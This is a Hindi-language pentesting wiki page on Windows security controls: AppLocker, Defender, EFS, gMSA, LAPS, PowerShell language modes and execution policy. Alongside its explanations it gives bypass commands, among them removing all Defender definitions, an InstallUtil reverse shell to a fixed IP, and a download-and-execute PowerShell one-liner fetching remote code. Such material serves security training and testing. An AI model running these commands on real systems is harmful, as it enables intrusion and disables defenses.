# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

An application whitelist उन approved software applications या executables की सूची होती है जिन्हें system पर मौजूद रहने और चलने की अनुमति होती है। इसका उद्देश्य environment को हानिकारक malware और ऐसे unapproved software से सुरक्षित रखना है जो किसी organization की specific business needs के अनुरूप नहीं होते।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और system administrators को यह control देता है कि **users किन applications और files को चला सकते हैं**। यह executables, scripts, Windows installer files, DLLs, packaged apps और packed app installers पर **granular control** प्रदान करता है।\
Organizations के लिए **cmd.exe और PowerShell.exe को block करना** और कुछ directories में write access को रोकना common है, **लेकिन इन सभी को bypass किया जा सकता है**।

### Check

Check करें कि कौन-सी files/extensions blacklisted/whitelisted हैं:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
यह registry path AppLocker द्वारा लागू किए गए configurations और policies को contain करता है, जिससे system पर लागू rules के current set की समीक्षा की जा सकती है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy को bypass करने के लिए उपयोगी **Writable folders**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को execute करने की अनुमति दे रहा है, तो कुछ **writable folders** हैं जिनका उपयोग आप **इसे bypass करने** के लिए कर सकते हैं।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- आमतौर पर **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries भी AppLocker को bypass करने में उपयोगी हो सकती हैं।
- **खराब तरीके से लिखे गए rules को भी bypass किया जा सकता है**
- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** के मामले में, आप कहीं भी **`allowed` नाम का folder** बना सकते हैं और उसे अनुमति मिल जाएगी।
- Organizations अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable को block करने** पर ध्यान केंद्रित करती हैं, लेकिन अन्य [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe` को भूल जाती हैं।
- सिस्टम पर पड़ने वाले अतिरिक्त load और कुछ भी खराब न हो, यह सुनिश्चित करने के लिए आवश्यक testing की मात्रा के कारण **DLL enforcement बहुत कम ही enabled होता है**। इसलिए **DLLs को backdoors के रूप में उपयोग करने से AppLocker को bypass करने में सहायता मिलेगी**।
- आप किसी भी process में **Powershell** code **execute** करने और AppLocker को bypass करने के लिए [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)।<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

इस file में local credentials मौजूद होते हैं; passwords hashed होते हैं।

### Local Security Authority (LSA) - LSASS

Single Sign-On के कारण इस subsystem की **memory** में **credentials** (hashed) **saved** रहते हैं।\
**LSA**, local **security policy** (password policy, users permissions...), **authentication**, **access tokens** आदि को administrate करता है।\
Local login के लिए **SAM** file में दिए गए credentials को **check** करने और domain user को authenticate करने के लिए **domain controller** से **talk** करने वाला component LSA ही होता है।

**Credentials**, **process LSASS** के अंदर **saved** रहते हैं: Kerberos tickets, NT और LM hashes, तथा आसानी से decrypted किए जा सकने वाले passwords।

### LSA secrets

LSA कुछ credentials को disk पर save कर सकता है:

- Active Directory के computer account का password (unreachable domain controller)।
- Windows services के accounts के passwords
- Scheduled tasks के passwords
- अन्य (IIS applications का password...)

### NTDS.dit

यह Active Directory का database है। यह केवल Domain Controllers में मौजूद होता है।

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है जो Windows 10 और Windows 11 तथा Windows Server के versions में उपलब्ध है। यह **`WinPEAS`** जैसे सामान्य pentesting tools को **block** करता है। हालांकि, इन **protections को bypass करने के तरीके** मौजूद हैं।

### जांच

**Defender** का **status** check करने के लिए आप PS cmdlet **`Get-MpComputerStatus`** execute कर सकते हैं (active है या नहीं, यह जानने के लिए **`RealTimeProtectionEnabled`** की value check करें):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे enumerate करने के लिए आप यह भी run कर सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS files को encryption के माध्यम से सुरक्षित करता है और इसके लिए **symmetric key** का उपयोग करता है, जिसे **File Encryption Key (FEK)** कहा जाता है। यह key user की **public key** से encrypted होकर encrypted file के $EFS **alternative data stream** में store होती है। जब decryption आवश्यक होता है, तो user के digital certificate की संबंधित **private key** का उपयोग $EFS stream से FEK को decrypt करने के लिए किया जाता है। अधिक जानकारी [यहां](https://en.wikipedia.org/wiki/Encrypting_File_System) मिल सकती है।

**User की पहल के बिना होने वाले Decryption scenarios** में शामिल हैं:

- जब files या folders को किसी non-EFS file system, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), में move किया जाता है, तो वे automatically decrypted हो जाते हैं।
- SMB/CIFS protocol के माध्यम से network पर भेजी जाने वाली encrypted files को transmission से पहले decrypt किया जाता है।

यह encryption method owner को encrypted files तक **transparent access** प्रदान करता है। हालांकि, केवल owner का password बदलकर login करने से decryption की अनुमति नहीं मिलेगी।

**Key Takeaways**:

- EFS एक symmetric FEK का उपयोग करता है, जो user की public key से encrypted होती है।
- Decryption में FEK तक पहुंचने के लिए user की private key का उपयोग किया जाता है।
- कुछ specific conditions में automatic decryption होता है, जैसे FAT32 पर copy करने या network transmission के दौरान।
- Encrypted files owner के लिए बिना किसी अतिरिक्त step के accessible होती हैं।

### EFS info check करना

जांचें कि किसी **user** ने इस **service** का **उपयोग** किया है या नहीं। इसके लिए जांचें कि यह path मौजूद है:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file>\` का उपयोग करके जांचें कि file तक **किसे** **access** प्राप्त है।  
आप किसी folder के अंदर `cipher /e` और `cipher /d` का उपयोग करके सभी files को **encrypt** और **decrypt** भी कर सकते हैं।

### EFS files को Decrypt करना

#### Being Authority System

इस तरीके के लिए आवश्यक है कि **victim user** host के अंदर कोई **process** **run** कर रहा हो। यदि ऐसा है, तो `meterpreter` session का उपयोग करके आप user के process के token को impersonate कर सकते हैं (`incognito` से `impersonate_token`)। या आप user के process पर `migrate` कर सकते हैं।

#### Users का password जानना

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ने IT infrastructures में service accounts के management को सरल बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। Traditional service accounts के विपरीत, जिनमें अक्सर "**Password never expire**" setting enabled होती है, gMSAs अधिक secure और manageable solution प्रदान करते हैं:

- **Automatic Password Management**: gMSAs एक complex, 240-character password का उपयोग करते हैं, जो domain या computer policy के अनुसार automatically change होता है। यह process Microsoft की Key Distribution Service (KDC) द्वारा handle की जाती है, जिससे manual password updates की आवश्यकता समाप्त हो जाती है।
- **Enhanced Security**: ये accounts lockouts से immune होते हैं और interactive logins के लिए उपयोग नहीं किए जा सकते, जिससे उनकी security बढ़ती है।
- **Multiple Host Support**: gMSAs को multiple hosts में share किया जा सकता है, जिससे वे multiple servers पर चलने वाली services के लिए ideal होते हैं।
- **Scheduled Task Capability**: Managed service accounts के विपरीत, gMSAs scheduled tasks चलाने का support देते हैं।
- **Simplified SPN Management**: Computer के sAMaccount details या DNS name में changes होने पर system automatically Service Principal Name (SPN) update करता है, जिससे SPN management सरल हो जाता है।

gMSAs के passwords LDAP property _**msDS-ManagedPassword**_ में stored होते हैं और Domain Controllers (DCs) द्वारा हर 30 दिनों में automatically reset किए जाते हैं। यह password, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) के नाम से जाना जाने वाला encrypted data blob है, जिसे केवल authorized administrators और उन servers द्वारा retrieve किया जा सकता है जिन पर gMSAs installed हैं, जिससे एक secure environment सुनिश्चित होता है। इस information तक पहुंचने के लिए LDAPS जैसे secured connection की आवश्यकता होती है, या connection को 'Sealing & Secure' के साथ authenticated होना चाहिए।

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

आप इस password को [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** से read कर सकते हैं】【。
```
/GMSAPasswordReader --AccountName jkohler
```
[**इस पोस्ट में अधिक जानकारी प्राप्त करें**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

इसके अलावा, यह [वेब पेज](https://cube0x0.github.io/Relaying-for-gMSA/) देखें कि **gMSA** का **password** **read** करने के लिए **NTLM relay attack** कैसे किया जाता है।<sup>[[3]](#references)</sup>

## LAPS

**Local Administrator Password Solution (LAPS)**, जिसे [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से download किया जा सकता है, local Administrator passwords के management को सक्षम बनाता है। ये **randomized**, unique और **नियमित रूप से बदले जाने वाले** passwords, Active Directory में centrally store किए जाते हैं। इन passwords तक access ACLs के माध्यम से authorized users तक restricted होता है। पर्याप्त permissions दिए जाने पर, local admin passwords को read करने की क्षमता प्राप्त हो जाती है।

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell को प्रभावी रूप से उपयोग करने के लिए आवश्यक कई **features को lock down** करता है, जैसे COM objects को block करना, केवल approved .NET types की अनुमति देना, XAML-based workflows, PowerShell classes और अन्य।

### **जांच**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
वर्तमान Windows में वह Bypass काम नहीं करेगा, लेकिन आप [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) का उपयोग कर सकते हैं।\
**इसे compile करने के लिए आपको** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ने की आवश्यकता हो सकती है और **project को .Net4.5 में बदलना होगा**।

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी process में **Powershell** code **execute** करने और constrained mode को bypass करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)।<sup>[[1]](#references)</sup>

## PS Execution Policy

By default यह **restricted.** पर set होती है। इस policy को bypass करने के मुख्य तरीके:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
और अधिक जानकारी [यहां](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup> मिल सकती है।

## Security Support Provider Interface (SSPI)

यह users को authenticate करने के लिए उपयोग की जाने वाली API है।

SSPI उन दो machines के लिए उचित protocol खोजने के लिए जिम्मेदार होता है, जो communicate करना चाहती हैं। इसके लिए preferred method Kerberos है। इसके बाद SSPI तय करेगा कि कौन-सा authentication protocol उपयोग किया जाएगा। इन authentication protocols को Security Support Provider (SSP) कहा जाता है। ये प्रत्येक Windows machine के अंदर DLL के रूप में स्थित होते हैं और communicate करने में सक्षम होने के लिए दोनों machines को समान SSP support करना चाहिए।

### Main SSPs

- **Kerberos**: Preferred protocol
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** और **NTLMv2**: Compatibility reasons
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers और LDAP, password MD5 hash के रूप में
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL और TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: उपयोग किए जाने वाले protocol को negotiate करने के लिए उपयोग किया जाता है (Kerberos या NTLM, जिसमें Kerberos default होता है)
- %windir%\Windows\System32\lsasrv.dll

#### Negotiation कई methods या केवल एक method offer कर सकती है।

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसी feature है, जो **elevated activities के लिए consent prompt** सक्षम करती है।

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Applocker और Powershell constrained language mode को bypass करना](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [EFS files को decrypt करने का तरीका](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA के लिए Relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy को Bypass करने के 15 तरीके](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
